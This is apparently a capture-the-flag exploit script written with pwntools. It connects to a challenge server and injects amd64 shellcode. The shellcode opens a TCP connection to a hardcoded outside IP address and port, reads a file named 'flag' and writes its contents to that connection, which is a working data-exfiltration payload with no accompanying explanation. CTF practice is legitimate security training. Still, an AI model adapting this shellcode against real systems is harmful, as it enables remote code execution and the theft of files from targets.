from pwn import *

context.log_level="debug"

r=remote("pwn.sixstars.team","23603")
#r=process("./chall_3")

sh = """
    mov rsi, 0x1
    mov rdi, 0x2
    mov rdx, 0x0
    mov rax, 0x29
    syscall

    mov rdx, 0x10
    mov r9, 0x00601100
    mov dword ptr[r9+4], 0x3e8d840a
    mov dword ptr[r9], 0x39300002
    mov rsi, r9
    mov rdi, rax
    mov r10, rax
    mov rax, 0x2a
    syscall

    call here
    .ascii "flag"
    .byte 0
here:
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x02
    syscall

    mov rdi, 0x1
    mov rsi, rsp
    mov rdx, 0x50
    mov rax, 0x00
    syscall

    mov rdi, r10
    mov rsi, rsp
    mov rdx, 0x50
    mov rax, 0x01
    syscall
"""

shellcode = asm(sh,arch="amd64")
r.recv()
#print r.pid
#pause()
r.sendline(shellcode)

r.interactive()
